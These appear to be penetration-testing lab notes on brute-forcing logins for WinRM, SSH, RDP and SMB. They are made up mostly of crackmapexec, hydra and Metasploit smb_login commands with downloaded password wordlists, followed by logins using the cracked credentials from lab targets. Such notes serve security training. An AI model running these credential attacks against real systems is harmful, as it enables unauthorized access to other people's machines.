# Network Services

## WinRM

WinRM uses the TCP ports 5985 (HTTP) and 5986 (HTTPS)

CrackMapExec
sudo apt-get -y install crackmapexec

wget -c https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt -O users.txt
wget -c https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -O 10-million-password-list-top-1000.txt

wget -c https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt -O users.list
wget -c https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-1000.txt -O 10-million-password-list-top-1000.list

crackmapexec winrm $TARGET -u users.list -p 10-million-password-list-top-1000.list


### Enumeration
crackmapexec winrm $TARGET

crackmapexec winrm $TARGET -u '' -p ''

crackmapexec winrm $TARGET -u '' -p '' --users


crackmapexec winrm $TARGET -u username.list -p password.list

evil-winrm -i $TARGET -u john -p november

## SSH

This service uses 3 different cryptography operations/methods: 

- symmetric encryption : Diffie-Hellman key exchange method is used
- asymmetric encryption : If private key obtained and not password protected, able to log in to the system without credentials.
- hashing : SSH uses hashing to confirm the authenticity of messages.

hydra -L username.list -P password.list ssh://$TARGET
ssh dennis@$TARGET
rockstar
type flag.txt

crackmapexec ssh $TARGET -u sam -p mut_password.list
hydra -l Kira -P password.list ssh://$TARGET


## RDP

Technically, the RDP is an application layer protocol in the IP stack and can use TCP and UDP for data transmission. 

hydra -L user.list -P password.list rdp://$TARGET
hydra -l sam -P mut_password.list ssh://$TARGET


xfreerdp /v:$TARGET /u:chris /p:789456123

## SMB

hydra -L user.list -P password.list smb://$TARGET

ERROR :
[ERROR] invalid reply from target smb://10.129.42.197:445/

-> outdated version of THC-Hydra that cannot handle SMBv3 replies

msfconsole -q
use auxiliary/scanner/smb/smb_login
options
set user_file user.list
set pass_file password.list
set rhosts 10.129.29.229

[+] 10.129.29.229:445     - 10.129.29.229:445 - Success: '.\cassie:12345678910'


crackmapexec smb $TARGET -u user.list -p password.list --shares

smbclient -U cassie \\\\10.129.29.229\\CASSIE
12345678910

get flag.txt